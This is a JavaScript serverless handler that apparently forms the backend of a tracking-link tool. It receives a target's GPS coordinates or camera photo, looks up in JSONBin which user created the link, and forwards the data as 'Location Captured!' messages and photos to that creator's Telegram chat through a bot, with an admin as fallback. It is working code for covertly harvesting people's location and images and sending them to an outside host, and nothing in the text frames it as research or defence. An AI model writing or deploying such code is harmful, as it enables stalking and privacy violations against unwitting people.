
export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const BOT_TOKEN = process.env.BOT_TOKEN;
  const ADMIN_ID = process.env.ADMIN_ID;
  const JSONBIN_BIN_ID = process.env.JSONBIN_BIN_ID;
  const JSONBIN_MASTER_KEY = process.env.JSONBIN_MASTER_KEY;

  const { linkId, type, photoData, coords } = req.body;

  if (!linkId) {
    return res.status(400).json({ error: 'Missing linkId' });
  }

  try {
    // STEP 1: Look up who created this link from JSONBin
    const lookupResponse = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}`, {
      headers: { 'X-Master-Key': JSONBIN_MASTER_KEY }
    });
    const jsonbinData = await lookupResponse.json();
    const links = jsonbinData?.record?.links || {};
    
    const linkData = links[linkId];
    let targetChatId = ADMIN_ID; // Default: admin
    let creatorName = 'Unknown';
    
    if (linkData && linkData.creator_chat_id) {
      targetChatId = linkData.creator_chat_id;
      creatorName = linkData.creator_name;
      console.log(`✅ Found creator: ${creatorName} (chat_id: ${targetChatId})`);
    } else {
      console.log(`❌ Link ${linkId} not found in JSONBin, sending to admin`);
    }

    // STEP 2: Send data to the CORRECT person
    if (type === 'location' && coords) {
      const message = 
`📍 **Location Captured!**

Latitude: \`${coords.lat}\`
Longitude: \`${coords.lng}\`
🌐 [View on Google Maps](https://www.google.com/maps?q=${coords.lat},${coords.lng})
⏰ Time: ${new Date().toISOString()}`;

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          chat_id: targetChatId, 
          text: message,
          parse_mode: 'Markdown'
        })
      });
      
      console.log(`✅ Location sent to ${targetChatId}`);
    }

    if (type === 'photo' && photoData) {
      // Remove base64 header
      const base64Data = photoData.replace(/^data:image\/\w+;base64,/, '');
      const buffer = Buffer.from(base64Data, 'base64');

      // Send photo via Telegram multipart upload
      const boundary = '----FormBoundary' + Math.random().toString(36).substring(2);
      
      let body = '';
      body += `--${boundary}\r\n`;
      body += `Content-Disposition: form-data; name="chat_id"\r\n\r\n`;
      body += `${targetChatId}\r\n`;
      body += `--${boundary}\r\n`;
      body += `Content-Disposition: form-data; name="photo"; filename="photo.jpg"\r\n`;
      body += `Content-Type: image/jpeg\r\n\r\n`;
      
      // Body needs to be a Buffer with binary data
      const bodyStart = Buffer.from(body, 'utf-8');
      const photoBuffer = Buffer.from(base64Data, 'base64');
      const bodyEnd = Buffer.from(`\r\n--${boundary}--\r\n`, 'utf-8');
      
      const finalBody = Buffer.concat([bodyStart, photoBuffer, bodyEnd]);

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        headers: {
          'Content-Type': `multipart/form-data; boundary=${boundary}`,
          'Content-Length': finalBody.length.toString()
        },
        body: finalBody
      });
      
      console.log(`✅ Photo sent to ${targetChatId}`);
    }

    res.status(200).json({ success: true, sentTo: targetChatId });
    
  } catch (error) {
    console.error('Error:', error);
    
    // Fallback: send to admin
    try {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: ADMIN_ID,
          text: `❌ Error: ${error.message}\nLink: ${linkId}\nType: ${type}`
        })
      });
    } catch(e) {}
    
    res.status(500).json({ error: 'Internal server error' });
  }
}
